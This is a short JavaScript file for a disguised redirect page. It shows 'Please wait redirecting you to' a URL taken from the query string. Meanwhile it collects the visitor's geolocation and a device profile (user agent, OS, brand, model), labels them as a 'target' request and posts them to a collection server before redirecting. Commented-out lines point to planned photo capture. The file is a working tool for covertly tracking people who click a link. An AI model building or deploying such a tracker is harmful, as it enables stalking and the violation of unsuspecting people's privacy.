const baseUrl = 'http://localhost:9000';

const loading = document.getElementById('loading');
const urlParams = new URLSearchParams(window.location.search);

const locationParam = urlParams.get('url')?.length > 0 ? urlParams.get('url') : "https://www.google.com";
loading.textContent = "Please wait redirecting you to " + locationParam;

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        function(position) {
            const location = {
                latitude:  position.coords.latitude,
                longitude: position.coords.longitude,
            }

            // const photo = {
            //     name: filename,
            //     path: "photos/" + filename
            // }

            const targetRequest = {
                location: location,
                device: getDeviceInformation(),
                // photo: photo
            }

            saveLocation(targetRequest)
                .then(() => {
                    console.log("Location saved successfully.");
                })
                .catch(err => {
                    console.error("Error saving location:", err);
                })
                .finally(() => {
                    window.location.replace(baseUrl + '/locations?url=' + encodeURIComponent(locationParam));
                })
        },
        function(error) {
            console.error("Error getting location:", error.message);
        }
    );
} else {
    console.error("Geolocation is not supported by this browser.");
}

const saveLocation = async (req) => {
    return new Promise((resolve, reject) => {
        fetch(baseUrl + '/locations', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(req)
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            resolve(response.json());
        })
        .catch(error => {
            console.error('Error sending coordinates:', error);
            reject(error);
        });
    });
}

const redirectURL = async () => {
    return new Promise((resolve, reject) => {
        fetch(baseUrl + '/locations', {
            method: 'GET',
        })
    });
}

const getDeviceInformation = () => {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;

    const getBrowser = () => {
        if (userAgent.includes("Firefox")) return "Firefox";
        if (userAgent.includes("Chrome")) return "Chrome";
        if (userAgent.includes("Safari")) return "Safari";
        if (userAgent.includes("Edge")) return "Edge";
        if (userAgent.includes("Opera")) return "Opera";
        return "Unknown";
    };

    const getOS = () => {
        if (userAgent.includes("Windows")) return "Windows";
        if (userAgent.includes("Mac")) return "MacOS";
        if (userAgent.includes("Linux")) return "Linux";
        if (userAgent.includes("Android")) return "Android";
        if (userAgent.includes("iOS")) return "iOS";
        return "Unknown";
    };

    const getDeviceBrand = () => {
        if (userAgent.includes("iPhone")) return "Apple";
        if (userAgent.includes("iPad")) return "Apple";
        if (userAgent.includes("Samsung")) return "Samsung";
        if (userAgent.includes("Huawei")) return "Huawei";
        if (userAgent.includes("Xiaomi")) return "Xiaomi";
        return "Unknown";
    };

    const getDeviceModel = () => {
        const match = userAgent.match(/\(([^)]+)\)/);
        return match ? match[1] : "Unknown";
    };

    return {
        model: getDeviceModel(),
        operating_system: getOS(),
        platform: platform,
        user_agent: userAgent,
        brand: getDeviceBrand(),
        browser: getBrowser(),
    };
}